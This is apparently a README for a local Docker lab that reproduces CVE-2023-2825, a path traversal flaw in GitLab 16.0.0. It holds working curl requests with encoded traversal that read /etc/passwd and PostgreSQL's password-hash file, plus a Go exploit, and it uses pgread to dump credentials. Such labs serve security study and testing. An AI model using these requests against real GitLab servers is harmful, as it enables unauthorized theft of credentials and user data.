# CVE-2023-2825 + pgread Lab

**GitLab Path Traversal → Dump PostgreSQL without credentials**

## Vulnerability

- **CVE**: CVE-2023-2825
- **CVSS**: 10.0 (Critical)
- **Affected**: GitLab CE/EE 16.0.0 only
- **Type**: Unauthenticated path traversal via uploads endpoint

### Requirements

1. Public project nested in 5+ groups
2. At least one file attachment in that project

## Setup

```bash
# Start GitLab + PostgreSQL
docker compose up -d

# Wait for GitLab to be ready (can take 5-10 minutes)
# Then run setup script to create nested groups + project + attachment
./setup.sh http://localhost:8080
```

## Exploit (Go)

```bash
cd exploit
go build -o exploit .

# Use the upload path from setup.sh output
./exploit http://localhost:8080 "/group1/group2/group3/group4/group5/vuln-project/uploads/<hash>/passwd"
```

## Manual

```bash
# 1. Test path traversal (read /etc/passwd)
curl "http://localhost:8080/group1/group2/group3/group4/group5/vuln-project/uploads/<hash>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"

# 2. Read PostgreSQL password hashes
curl "http://localhost:8080/group1/group2/group3/group4/group5/vuln-project/uploads/<hash>/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar%2flib%2fpostgresql%2fdata%2fglobal%2f1260" -o 1260
pgread -f 1260
```

## Why GitLab + pgread is Critical

GitLab Docker images run as **root** by default, giving read access to any file on the system including PostgreSQL data directories.

| Before pgread | With pgread |
|---------------|-------------|
| Path Traversal = Medium | Path Traversal = **Critical** |
| "I can read /etc/passwd" | "I dumped GitLab database credentials and all user data" |

## References

- https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/
- https://nvd.nist.gov/vuln/detail/CVE-2023-2825
